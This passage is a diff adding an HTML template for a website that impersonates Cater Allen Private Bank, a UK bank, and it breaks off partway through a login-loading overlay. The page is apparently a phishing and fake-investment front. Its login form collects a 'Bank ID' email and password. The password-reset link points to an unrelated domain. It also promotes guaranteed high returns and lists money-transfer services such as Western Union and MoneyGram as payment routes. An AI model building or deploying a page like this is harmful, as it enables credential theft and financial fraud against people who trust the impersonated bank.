@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cater Allen Private Bank | UK Online Banking</title>
+    
+    <link rel="icon" type="image/png" href="{{ url_for('static', filename='logo.png') }}">
+    <meta property="og:title" content="Cater Allen Private Bank | UK Online Banking">
+    <meta property="og:description" content="Secure Private management & Banking">
+    <meta property="og:image" content="{{ request.url_root.rstrip('/') }}{{ url_for('static', filename='logo.png') }}">
+    <meta property="og:url" content="{{ request.url }}">
+    <meta property="og:type" content="website">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            overflow-x: hidden;
+            overflow-y: auto !important;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes flagWave {
+            0% { background-position: 0% 50%; transform: scale(1); }
+            50% { background-position: 100% 50%; transform: scale(1.02); }
+            100% { background-position: 0% 50%; transform: scale(1); }
+        }
+
+        .animate-fade-in {
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        .uk-flag-bg-light {
+            position: relative;
+        }
+        .uk-flag-bg-light::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background-image: url('https://upload.wikimedia.org/wikipedia/en/a/ae/Flag_of_the_United_Kingdom.svg');
+            background-size: cover;
+            background-position: center;
+            opacity: 0.50;
+            mix-blend-mode: luminosity;
+            animation: flagWave 14s ease-in-out infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .bank-header {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .nav-link {
+            font-size: 13px;
+            font-weight: 600;
+            color: #334155;
+            transition: color 0.2s ease;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .nav-link:hover {
+            color: #002147;
+        }
+
+        .app-card {
+            background: #ffffff;
+            color: #1e293b;
+            border-radius: 1.25rem;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        }
+
+        .info-card {
+            background: #ffffff;
+            color: #1e293b;
+            border-radius: 1rem;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+            border: 1px solid #e2e8f0;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+
+        .info-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 25px rgba(0,0,0,0.12);
+        }
+
+        .sidebar-backdrop {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+        }
+
+        .sidebar-panel {
+            background: #002147;
+            color: #ffffff;
+            height: 100vh;
+            box-shadow: 5px 0 25px rgba(0,0,0,0.3);
+        }
+
+        .sidebar-link {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.85rem 1rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            color: #e2e8f0;
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            transition: background 0.2s ease;
+        }
+
+        .sidebar-link:hover {
+            background: rgba(220, 38, 38, 0.2);
+            color: #ffffff;
+        }
+
+        .partner-logo-box {
+            background: #ffffff;
+            border: 1px solid #cbd5e1;
+            border-radius: 0.85rem;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.5rem 1rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            transition: transform 0.2s ease;
+        }
+        .partner-logo-box:hover {
+            transform: translateY(-2px);
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .dashed-circle-spinner {
+            width: 56px;
+            height: 56px;
+            border: 4px dashed #002147;
+            border-top: 4px solid #ef4444;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+    </style>
+</head>
+<body class="antialiased uk-flag-bg-light">
+
+    <!-- Sliding Sidebar Menu -->
+    <div id="sidebarBackdrop" class="sidebar-backdrop fixed inset-0 z-50 hidden animate-fade-in" onclick="closeSidebar()" aria-hidden="true">
+        <aside id="sidebarPanel" class="sidebar-panel h-screen w-[85%] max-w-sm -translate-x-full transform transition-transform duration-300 ease-out overflow-y-auto fixed top-0 left-0 z-50" onclick="event.stopPropagation()">
+            <div class="p-6 pb-20 relative z-10">
+                <div class="flex items-start justify-between mb-6 border-b border-white/10 pb-4">
+                    <div class="flex items-center gap-3">
+                        <img src="{{ url_for('static', filename='logo.png') }}" alt="Cater Allen" class="w-10 h-10 rounded object-contain bg-white p-1 shadow-sm">
+                        <div>
+                            <h2 class="text-white text-sm font-black uppercase tracking-[0.2em]">Cater Allen</h2>
+                            <p class="text-[10px] text-amber-400 font-bold uppercase tracking-wider">Private Bank UK</p>
+                        </div>
+                    </div>
+                    <button type="button" onclick="closeSidebar()" class="w-9 h-9 rounded-lg border border-white/30 text-white hover:bg-white/10 flex items-center justify-center transition-all" aria-label="Close menu">
+                        <i class="fa-solid fa-xmark"></i>
+                    </button>
+                </div>
+
+                <div class="space-y-6 text-xs">
+                    <div>
+                        <p class="text-[10px] font-black text-amber-400 uppercase tracking-widest mb-2">Quick Navigation</p>
+                        <ul class="space-y-1">
+                            <li><a href="{{ url_for('about') }}" class="sidebar-link"><span><i class="fa-solid fa-info-circle mr-2.5 text-amber-400"></i> About Us</span><span>›</span></a></li>
+                            <li><a href="{{ url_for('news') }}" class="sidebar-link"><span><i class="fa-solid fa-newspaper mr-2.5 text-amber-400"></i> News &amp; Markets</span><span>›</span></a></li>
+                            <li><a href="{{ url_for('contact') }}" class="sidebar-link"><span><i class="fa-solid fa-headset mr-2.5 text-amber-400"></i> Contact Us</span><span>›</span></a></li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <p class="text-[10px] font-black text-amber-400 uppercase tracking-widest mb-2">Banking Products</p>
+                        <ul class="space-y-1">
+                            <li><button type="button" onclick="openProductDetail('personal'); closeSidebar();" class="sidebar-link w-full text-left"><span><i class="fa-solid fa-user mr-2.5 text-red-500"></i> Personal Banking</span><span>›</span></button></li>
+                            <li><button type="button" onclick="openProductDetail('business'); closeSidebar();" class="sidebar-link w-full text-left"><span><i class="fa-solid fa-briefcase mr-2.5 text-red-500"></i> Business Banking</span><span>›</span></button></li>
+                            <li><button type="button" onclick="openProductDetail('specialist'); closeSidebar();" class="sidebar-link w-full text-left"><span><i class="fa-solid fa-building-columns mr-2.5 text-red-500"></i> Specialist Banking</span><span>›</span></button></li>
+                            <li><button type="button" onclick="openProductDetail('advisers'); closeSidebar();" class="sidebar-link w-full text-left"><span><i class="fa-solid fa-user-tie mr-2.5 text-red-500"></i> Financial Advisers</span><span>›</span></button></li>
+                            <li><button type="button" onclick="openProductDetail('deposit'); closeSidebar();" class="sidebar-link w-full text-left"><span><i class="fa-solid fa-vault mr-2.5 text-red-500"></i> Fixed Term Deposit</span><span>›</span></button></li>
+                            <li><button type="button" onclick="openProductDetail('vault'); closeSidebar();" class="sidebar-link w-full text-left"><span><i class="fa-solid fa-globe mr-2.5 text-red-500"></i> Multi-Currency Vault</span><span>›</span></button></li>
+                            <li><button type="button" onclick="openProductDetail('security'); closeSidebar();" class="sidebar-link w-full text-left"><span><i class="fa-solid fa-shield-halved mr-2.5 text-red-500"></i> FCA &amp; FSCS Security</span><span>›</span></button></li>
+                        </ul>
+                    </div>
+
+                    <div class="pt-2">
+                        <button type="button" onclick="openBranchModal(); closeSidebar();" class="w-full bg-red-600 text-white py-3 rounded-xl font-bold uppercase tracking-wider text-[11px] hover:bg-red-700 transition-all shadow-md">
+                            Branch Onboarding Inquiry
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </aside>
+    </div>
+
+    <!-- Header -->
+    <header class="bank-header sticky top-0 z-40 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-8 py-3.5 flex items-center justify-between border-b border-slate-100">
+            <div class="flex items-center gap-3 sm:gap-4">
+                <button type="button" onclick="openSidebar()" class="text-[#002147] text-xl focus:outline-none hover:text-red-600 transition-colors p-1" aria-label="Open Menu">
+                    <i class="fa-solid fa-bars"></i>
+                </button>
+                
+                <!-- Static Logo + Bold Bank Name & Lite Est Date -->
+                <a href="/" class="flex items-center gap-3">
+                    <img src="{{ url_for('static', filename='logo.png') }}" alt="Cater Allen Logo" class="h-9 sm:h-10 w-auto object-contain">
+                    <div class="flex flex-col">
+                        <span class="text-[#002147] font-black text-xs sm:text-base tracking-wider uppercase leading-tight">Cater Allen Private Bank</span>
+                        <span class="text-[9px] sm:text-[10px] text-slate-400 font-semibold uppercase tracking-widest leading-none mt-0.5">London Registered • Est. 1816</span>
+                    </div>
+                </a>
+            </div>
+            
+            <div class="flex items-center gap-3 sm:gap-4">
+                <div class="hidden lg:flex items-center gap-6 text-xs font-bold text-slate-600">
+                    <a href="{{ url_for('about') }}" class="hover:text-[#002147] transition-colors">About us</a>
+                    <a href="{{ url_for('news') }}" class="hover:text-[#002147] transition-colors">News</a>
+                    <a href="{{ url_for('contact') }}" class="hover:text-[#002147] transition-colors">Contact us</a>
+                </div>
+
+                <div class="flex items-center gap-2">
+                    <button type="button" onclick="triggerLoginLoading()" class="bg-[#002147] text-white px-3.5 sm:px-4 py-2.5 rounded-full text-xs font-extrabold shadow-md hover:bg-slate-900 transition-all cursor-pointer">
+                        Login
+                    </button>
+                    <button type="button" onclick="openRegisterModal()" class="bg-[#002147] text-white px-3.5 sm:px-4 py-2.5 rounded-full text-xs font-extrabold shadow-md hover:bg-slate-900 transition-all cursor-pointer border border-blue-300/30">
+                        Register
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <nav class="bg-white shadow-xs">
+            <div class="max-w-7xl mx-auto px-4 sm:px-8 flex items-center justify-between py-3 overflow-x-auto no-scrollbar">
+                <div class="flex items-center gap-8 whitespace-nowrap">
+                    <button type="button" onclick="openProductDetail('personal')" class="nav-link">Accounts <i class="fa-solid fa-chevron-down text-[10px] text-slate-400"></i></button>
+                    <button type="button" onclick="openProductDetail('advisers')" class="nav-link">Intermediaries <i class="fa-solid fa-chevron-down text-[10px] text-slate-400"></i></button>
+                    <button type="button" onclick="openProductDetail('security')" class="nav-link">Banking support <i class="fa-solid fa-chevron-down text-[10px] text-slate-400"></i></button>
+                    <button type="button" onclick="openProductDetail('vault')" class="nav-link">Financial wellbeing &amp; support <i class="fa-solid fa-chevron-down text-[10px] text-slate-400"></i></button>
+                    <button type="button" onclick="openProductDetail('security')" class="nav-link">Fraud &amp; Security Centre <i class="fa-solid fa-chevron-down text-[10px] text-slate-400"></i></button>
+                </div>
+                <div class="hidden sm:block text-slate-400 text-sm pl-4">
+                    <i class="fa-solid fa-magnifying-glass cursor-pointer hover:text-[#002147]"></i>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow py-8 px-4 sm:px-8 max-w-7xl mx-auto w-full animate-fade-in relative z-10">
+        
+        <!-- Hero Showcase -->
+        <div class="relative bg-[#001226] text-white rounded-3xl overflow-hidden shadow-2xl mb-12 border border-slate-800">
+            <div class="absolute inset-0 bg-gradient-to-r from-[#001226] via-[#001226]/90 to-transparent z-10"></div>
+            
+            <div class="relative z-20 grid grid-cols-1 lg:grid-cols-12 min-h-[420px] items-center">
+                <div class="lg:col-span-7 p-8 sm:p-12 space-y-5">
+                    <div class="inline-flex items-center gap-2 bg-amber-400/10 border border-amber-400/30 text-amber-400 text-[10px] font-black uppercase tracking-widest px-3 py-1 rounded-full">
+                        <i class="fa-solid fa-shield-halved"></i> UK Regulated Private Wealth
+                    </div>
+                    
+                    <div id="heroTextContainer" class="space-y-3 transition-opacity duration-500">
+                        <h1 id="heroTitle" class="text-3xl sm:text-5xl font-black tracking-tight text-white font-sans leading-tight">
+                            We're proud to partner with Sibstar
+                        </h1>
+                        <p id="heroSubtitle" class="text-xs sm:text-sm text-slate-300 leading-relaxed max-w-xl">
+                            Need extra support managing money, or supporting someone who is? Sibstar helps people spend safely and manage their money with confidence. Their debit card and app help support independent living and give families peace of mind.
+                        </p>
+                    </div>
+
+                    <div class="pt-2 flex items-center gap-4">
+                        <button type="button" id="heroActionBtn" onclick="openProductDetail('personal')" class="bg-white text-[#002147] hover:bg-slate-100 px-6 py-3 rounded-full text-xs font-black uppercase tracking-wider transition-all shadow-md">
+                            Learn more
+                        </button>
+                    </div>
+                    
+                    <p class="text-[10px] text-slate-400 pt-2 border-t border-white/10 flex items-center gap-2">
+                        <i class="fa-solid fa-circle-info text-amber-400"></i> Sibstar is a paid-for service and is not part of Cater Allen.
+                    </p>
+                </div>
+
+                <div class="lg:col-span-5 h-full min-h-[300px] relative overflow-hidden">
+                    <img id="heroImage" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=1000&q=80" alt="Banking Showcase" class="w-full h-full object-cover transform hover:scale-105 transition-transform duration-700">
+                </div>
+            </div>
+
+            <div class="absolute bottom-4 right-8 z-30 hidden sm:flex items-center gap-2">
+                <button type="button" onclick="setHeroSlide(0)" id="dot-0" class="w-6 h-2 rounded-full bg-amber-400 transition-all" aria-label="Slide 1"></button>
+                <button type="button" onclick="setHeroSlide(1)" id="dot-1" class="w-2 h-2 rounded-full bg-white/50 hover:bg-white transition-all" aria-label="Slide 2"></button>
+                <button type="button" onclick="setHeroSlide(2)" id="dot-2" class="w-2 h-2 rounded-full bg-white/50 hover:bg-white transition-all" aria-label="Slide 3"></button>
+            </div>
+        </div>
+
+        <!-- 6 Feature Cards Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-16">
+            <div class="info-card p-6 flex flex-col justify-between" onclick="openProductDetail('personal')">
+                <div>
+                    <div class="h-44 rounded-xl overflow-hidden mb-4 bg-slate-100">
+                        <img src="https://images.unsplash.com/photo-1544717305-2782549b5136?auto=format&fit=crop&w=800&q=80" alt="Personal Banking" class="w-full h-full object-cover">
+                    </div>
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-base font-extrabold text-[#002147]">Personal banking</h3>
+                        <span class="bg-blue-50 text-blue-700 font-black text-[9px] px-2 py-0.5 rounded-full uppercase tracking-wider">Current &amp; Savings</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        A range of current and savings accounts made to meet your needs. Designed for seamless everyday transactions and capital growth.
+                    </p>
+                </div>
+                <div class="mt-5 pt-3 border-t border-slate-100 flex items-center justify-between text-xs font-bold text-red-600 group">
+                    <span class="group-hover:underline">All personal bank accounts</span>
+                    <i class="fa-solid fa-arrow-right transition-transform group-hover:translate-x-1"></i>
+                </div>
+            </div>
+
+            <div class="info-card p-6 flex flex-col justify-between" onclick="openProductDetail('business')">
+                <div>
+                    <div class="h-44 rounded-xl overflow-hidden mb-4 bg-slate-100">
+                        <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=800&q=80" alt="Business Banking" class="w-full h-full object-cover">
+                    </div>
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-base font-extrabold text-[#002147]">Business banking</h3>
+                        <span class="bg-emerald-50 text-emerald-700 font-black text-[9px] px-2 py-0.5 rounded-full uppercase tracking-wider">Multi-Currency</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        A way to manage your business finances. Including euro and US dollar accounts with streamlined commercial banking support.
+                    </p>
+                </div>
+                <div class="mt-5 pt-3 border-t border-slate-100 flex items-center justify-between text-xs font-bold text-red-600 group">
+                    <span class="group-hover:underline">All business bank accounts</span>
+                    <i class="fa-solid fa-arrow-right transition-transform group-hover:translate-x-1"></i>
+                </div>
+            </div>
+
+            <div class="info-card p-6 flex flex-col justify-between" onclick="openProductDetail('specialist')">
+                <div>
+                    <div class="h-44 rounded-xl overflow-hidden mb-4 bg-slate-100">
+                        <img src="https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?auto=format&fit=crop&w=800&q=80" alt="Specialist Banking" class="w-full h-full object-cover">
+                    </div>
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-base font-extrabold text-[#002147]">Specialist banking</h3>
+                        <span class="bg-purple-50 text-purple-700 font-black text-[9px] px-2 py-0.5 rounded-full uppercase tracking-wider">Trusts &amp; Charities</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        Years of experience with accounts for trusts, charities, pensions, and more, managed by dedicated fiduciary specialists.
+                    </p>
+                </div>
+                <div class="mt-5 pt-3 border-t border-slate-100 flex items-center justify-between text-xs font-bold text-red-600 group">
+                    <span class="group-hover:underline">All specialist bank accounts</span>
+                    <i class="fa-solid fa-arrow-right transition-transform group-hover:translate-x-1"></i>
+                </div>
+            </div>
+
+            <div class="info-card p-6 flex flex-col justify-between" onclick="openProductDetail('deposit')">
+                <div>
+                    <div class="h-44 rounded-xl overflow-hidden mb-4 bg-slate-100">
+                        <img src="https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=800&q=80" alt="Fixed Term Deposit" class="w-full h-full object-cover">
+                    </div>
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-base font-extrabold text-[#002147]">Fixed Term Deposit</h3>
+                        <span class="bg-red-50 text-red-600 font-black text-[9px] px-2 py-0.5 rounded-full uppercase tracking-wider">Up to 6.25% AER</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        Lock in guaranteed high returns with our fixed-term savings accounts tailored for private clients. Terms available from 3 to 24 months.
+                    </p>
+                </div>
+                <div class="mt-5 pt-3 border-t border-slate-100 flex items-center justify-between text-xs font-bold text-red-600 group">
+                    <span class="group-hover:underline">Read Product Details</span>
+                    <i class="fa-solid fa-arrow-right transition-transform group-hover:translate-x-1"></i>
+                </div>
+            </div>
+
+            <div class="info-card p-6 flex flex-col justify-between" onclick="openProductDetail('vault')">
+                <div>
+                    <div class="h-44 rounded-xl overflow-hidden mb-4 bg-slate-100">
+                        <img src="https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?auto=format&fit=crop&w=800&q=80" alt="Multi-Currency Wealth Vault" class="w-full h-full object-cover">
+                    </div>
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-base font-extrabold text-[#002147]">Multi-Currency Wealth Vault</h3>
+                        <span class="bg-blue-50 text-blue-700 font-black text-[9px] px-2 py-0.5 rounded-full uppercase tracking-wider">Global Settlement</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        Hold and transact across GBP, EUR, USD, and CHF seamlessly. Designed for international families and businesses requiring multi-jurisdictional liquidity.
+                    </p>
+                </div>
+                <div class="mt-5 pt-3 border-t border-slate-100 flex items-center justify-between text-xs font-bold text-red-600 group">
+                    <span class="group-hover:underline">Read Product Details</span>
+                    <i class="fa-solid fa-arrow-right transition-transform group-hover:translate-x-1"></i>
+                </div>
+            </div>
+
+            <div class="info-card p-6 flex flex-col justify-between" onclick="openProductDetail('security')">
+                <div>
+                    <div class="h-44 rounded-xl overflow-hidden mb-4 bg-[#002147] flex items-center justify-center text-white">
+                        <div class="text-center p-4">
+                            <i class="fa-solid fa-shield-halved text-3xl text-amber-400 mb-2"></i>
+                            <p class="text-xs font-black uppercase tracking-widest">FSCS Protected</p>
+                            <p class="text-[11px] text-slate-300 mt-0.5">Eligible deposits protected up to £85,000</p>
+                        </div>
+                    </div>
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-base font-extrabold text-[#002147]">Uncompromising Security</h3>
+                        <span class="bg-amber-50 text-amber-800 font-black text-[9px] px-2 py-0.5 rounded-full uppercase tracking-wider">FCA Regulated</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        Full compliance with UK regulatory standards, multi-layered cybersecurity, and absolute protection for your wealth.
+                    </p>
+                </div>
+                <div class="mt-5 pt-3 border-t border-slate-100 flex items-center justify-between text-xs font-bold text-red-600 group">
+                    <span class="group-hover:underline">Regulatory Standards</span>
+                    <i class="fa-solid fa-arrow-right transition-transform group-hover:translate-x-1"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- Verified Official Payment & Transfer Partners Section -->
+        <div class="bg-white border border-slate-200 rounded-2xl p-6 sm:p-8 mb-12 shadow-sm">
+            <div class="text-center mb-6">
+                <p class="text-[11px] font-black text-amber-600 uppercase tracking-[0.2em] mb-1">Global Gateway &amp; Payment Partners</p>
+                <h3 class="text-[#002147] text-sm font-bold uppercase tracking-wider">Accepted Transfer Networks &amp; Payment Methods</h3>
+            </div>
+            
+            <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-4">
+                <div class="partner-logo-box">
+                    <svg viewBox="0 0 100 32" class="h-6 w-auto" fill="none">
+                        <path d="M10.2 3.8h5.8c3.2 0 5.4 1.3 5.4 4.3 0 2.8-2 4.6-5.2 4.6h-3.4l-1 5.4H4.8l2.9-14.3h2.5zm1.5 6.4h2.2c1.4 0 2.4-.6 2.4-2.1 0-1.4-.9-2.1-2.3-2.1h-1.6l-.3 4.2z" fill="#003087"/>
+                        <path d="M22.5 3.8h5.3l-2.9 14.3h-4.3l2.9-14.3z" fill="#0079C1"/>
+                        <path d="M30.2 3.8h5.8c3.2 0 5.4 1.3 5.4 4.3 0 2.8-2 4.6-5.2 4.6h-3.4l-1 5.4h-2.8l2.9-14.3h2.5zm1.5 6.4h2.2c1.4 0 2.4-.6 2.4-2.1 0-1.4-.9-2.1-2.3-2.1h-1.6l-.3 4.2z" fill="#003087"/>
+                        <path d="M42.5 8.1c0-2.6 2.1-4.5 5.5-4.5 1.7 0 3.2.4 4.2 1.1l-1.2 2.6c-.8-.5-1.8-.8-2.9-.8-1.5 0-2.4.7-2.4 1.7 0 1 .9 1.4 2.3 2 1.6.7 3.7 1.5 3.7 3.9 0 2.4-1.9 4.2-5.1 4.2-1.8 0-3.4-.5-4.5-1.3l1.3-2.7c.9.6 2.1 1 3.2 1 1.6 0 2.6-.7 2.6-1.9 0-1.1-.9-1.5-2.4-2.1-1.6-.7-3.6-1.5-3.6-3.7z" fill="#0079C1"/>
+                        <path d="M54.5 3.8h4.2l-2.2 14.3h-4.2l2.2-14.3z" fill="#003087"/>
+                        <path d="M60.8 3.8h4.1l-1.3 8.7 3.9-8.7h4.4l-6.1 14.3h-4.4l3.4-14.3z" fill="#0079C1"/>
+                    </svg>
+                </div>
+
+                <div class="partner-logo-box">
+                    <div class="flex items-center gap-1.5">
+                        <div class="w-6 h-6 rounded-full bg-[#00D632] flex items-center justify-center text-white font-black text-sm">£</div>
+                        <span class="text-xs font-extrabold text-slate-900 tracking-tight">Cash App</span>
+                    </div>
+                </div>
+
+                <div class="partner-logo-box">
+                    <svg viewBox="0 0 100 32" class="h-5 w-auto" fill="none">
+                        <path d="M38.5 3.2l-5.6 20.3h-5.2l-3.4-14.1c-.4-1.6-.8-2.2-2.1-2.9-1.9-1-5.1-1.9-8-2.5l.2-1h9.1c2.7 0 5 .7 6.2 3.8l5.3 16.3 6.1-20.1h5.5zM22.5 13.5l3.2 10.3c.7 2.2 1.3 3.6 2.1 4.8h-5.8l-1-4.8H18l-1 4.8h-5l4.8-19.1h5.7l-.3 4.8zm-3.2 7.7l1.7-7.9c.2-1 .5-1.6.8-2.5l1.1 5c.4 1.8.8 3.7 1.2 5.4h-3.8zM11.9 3.2L6.8 19.5c-.6-3-2.4-5-5.3-6.1L4.6 3.2h7.3zm-13.9 0h5l1.1 20.3h-5L-2 3.2z" fill="#1A1F71"/>
+                    </svg>
+                </div>
+
+                <div class="partner-logo-box">
+                    <div class="flex items-center -space-x-2.5">
+                        <div class="w-6 h-6 rounded-full bg-[#EB001B] opacity-90"></div>
+                        <div class="w-6 h-6 rounded-full bg-[#F79E1B] opacity-90"></div>
+                    </div>
+                    <span class="ml-1.5 text-[10px] font-black tracking-tighter text-slate-900">mastercard</span>
+                </div>
+
+                <div class="partner-logo-box">
+                    <div class="bg-[#FFCC00] text-black font-black text-[10px] px-2 py-0.5 rounded shadow-xs tracking-tighter">
+                        WESTERN<br><span class="text-[8px] tracking-normal">UNION</span>
+                    </div>
+                </div>
+
+                <div class="partner-logo-box">
+                    <div class="flex items-center gap-1">
+                        <div class="w-4 h-4 rounded-full bg-[#EF3340] flex items-center justify-center text-white font-black text-[9px]">M</div>
+                        <span class="text-xs font-black text-[#EF3340] tracking-tighter">MoneyGram</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Product Detail Drawer -->
+    <div id="productDetailModal" class="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4 sm:p-6">
+        <div class="app-card max-w-2xl w-full max-h-[90vh] overflow-y-auto p-6 sm:p-10 relative">
+            <button type="button" onclick="closeProductDetail()" class="absolute top-6 right-6 w-10 h-10 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-700 flex items-center justify-center text-base transition-all">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div id="productDetailContent"></div>
+            <div class="mt-8 pt-6 border-t border-slate-200 flex flex-col sm:flex-row gap-3">
+                <button type="button" onclick="closeProductDetail(); openBranchModal();" class="flex-1 py-3.5 bg-red-600 hover:bg-red-700 text-white rounded-xl text-xs font-black uppercase tracking-widest transition-all shadow-md">
+                    In-Branch Onboarding Inquiry
+                </button>
+                <button type="button" onclick="closeProductDetail()" class="px-6 py-3.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-bold uppercase tracking-widest transition-all">
+                    Back to Home
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="app-card max-w-md w-full p-8 relative">
+            <button type="button" onclick="closeLoginModal()" class="absolute top-6 right-6 text-slate-400 hover:text-slate-600 text-lg">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+
+            <h2 class="text-lg font-black text-slate-900 mb-6 text-center">Login to your Online Banking</h2>
+
+            {% if error %}
+            <div class="mb-6 rounded-xl border-l-4 border-red-600 bg-red-50 p-4 text-xs font-bold text-red-900 flex items-start gap-3 shadow-sm" role="alert">
+                <i class="fa-solid fa-circle-exclamation text-red-600 mt-0.5"></i>
+                <div>{{ error }}</div>
+            </div>
+            {% endif %}
+
+            <form action="/login" method="POST" id="loginForm" onsubmit="handleLoginSubmit(event)" class="space-y-5">
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-2">Bank ID</label>
+                    <input type="email" name="email" required placeholder="name@private.com" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium text-slate-800 outline-none focus:border-red-600 focus:ring-2 focus:ring-red-600/10">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-2">Password</label>
+                    <div class="relative">
+                        <input type="password" id="passwordInput" name="password" required placeholder="Enter your password" class="w-full px-4 py-3.5 pr-12 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium text-slate-800 outline-none focus:border-red-600 focus:ring-2 focus:ring-red-600/10">
+                        <button type="button" onclick="togglePasswordVisibility()" class="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 focus:outline-none" aria-label="Toggle password visibility">
+                            <i id="passwordToggleIcon" class="fa-solid fa-eye text-sm"></i>
+                        </button>
+                    </div>
+                    <p class="text-[11px] text-slate-500 mt-1.5">You may know this as your secure passphrase or customer PIN.</p>
+                </div>
+
+                <div class="space-y-3 pt-2">
+                    <label class="flex items-center gap-3 cursor-pointer">
+                        <input type="checkbox" class="w-4 h-4 rounded text-red-600 focus:ring-red-500 border-slate-300">
+                        <span class="text-xs font-medium text-slate-700">Remember Bank ID</span>
+                    </label>
+                    <label class="flex items-center gap-3 cursor-pointer">
+                        <input type="checkbox" class="w-4 h-4 rounded text-red-600 focus:ring-red-500 border-slate-300">
+                        <span class="text-xs font-medium text-slate-700">I'm using a public or shared device</span>
+                    </label>
+                </div>
+
+                <div class="pt-2 pb-1 flex items-center justify-between text-xs text-slate-600 bg-slate-50 p-3 rounded-xl border border-slate-200">
+                    <span class="font-bold flex items-center gap-2"><i class="fa-solid fa-fingerprint text-red-600"></i> Biometric Login Ready</span>
+                    <span class="text-[10px] bg-emerald-100 text-emerald-800 font-bold px-2 py-0.5 rounded-full uppercase">Active</span>
+                </div>
+
+                <div class="pt-2">
+                    <button type="submit" class="w-full py-4 bg-red-600 hover:bg-red-700 text-white text-xs font-black uppercase tracking-[0.2em] rounded-xl shadow-md transition-all">
+                        Login
+                    </button>
+                </div>
+
+                <div class="text-center pt-3">
+                    <a href="mailto:support@vertexprivatefinance.co.uk?subject=Password%20Reset%20Request" class="text-xs font-bold text-red-600 hover:text-red-800 transition-colors">Forgotten details?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- 3-Second Broken-Circle Loader for Login Button -->
+    <div id="loginLoadingOverlay" class="fixed inset-0 bg-slate-950/70 backdrop-blur-md z-50 hidden flex-col items-center justify-center p-6 text-slate-900">
+        <div class="bg-white border border-slate-200 p-8 rounded-3xl max-w-sm w-full text-center shadow-2xl animate-fade-in">
